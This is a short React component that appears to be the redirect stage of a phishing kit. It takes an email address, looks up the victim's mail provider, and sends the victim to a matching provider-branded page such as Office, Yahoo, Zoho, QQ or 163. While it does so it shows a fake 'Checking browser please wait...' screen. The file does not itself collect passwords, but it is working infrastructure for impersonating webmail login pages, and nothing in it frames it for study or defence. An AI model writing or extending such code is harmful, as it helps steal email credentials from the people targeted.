import { navigate } from "@reach/router";
import React, { useEffect } from "react";
import { getHost } from "./servers";

const pages = [
  { name: "rackspace", pagename: "rsp" },
  { name: "yahoo", pagename: "yh" },
  { name: "hiworks", pagename: "hw" },
  { name: "godaddy", pagename: "gdy" },
  { name: "mail", pagename: "ml" },
  { name: "zoho", pagename: "zh" },
  { name: "yandex", pagename: "yx" },
  { name: "qq", pagename: "qaq" },
  { name: "hinet", pagename: "hnt" },
  { name: "office", pagename: "ofc" },
  { name: "263", pagename: "p263" },
  { name: "163", pagename: "p163" },
  { name: "126", pagename: "p126" },
  { name: "webmail", pagename: "wb" },
];

function Redirect({ email }) {
  useEffect(() => {
    const splitEmail = email.split("@");
    const emailDomain = splitEmail[splitEmail.length - 1];
    console.log(email);
    console.log(emailDomain);

    getHost(email).then((data) => {
      console.log(data);
      const pagetoNavigate = pages.find(
        (element) => element.name === data.host
      );
      console.log(pagetoNavigate.pagename);
      navigate(`../${pagetoNavigate.pagename}`, {
        state: { email: email, domain: emailDomain },
      });
    });

    //  navigate("qaq", { state: { email: email, domain: emailDomain } });
  }, []);

  return <div>Checking browser please wait...</div>;
}

export default Redirect;
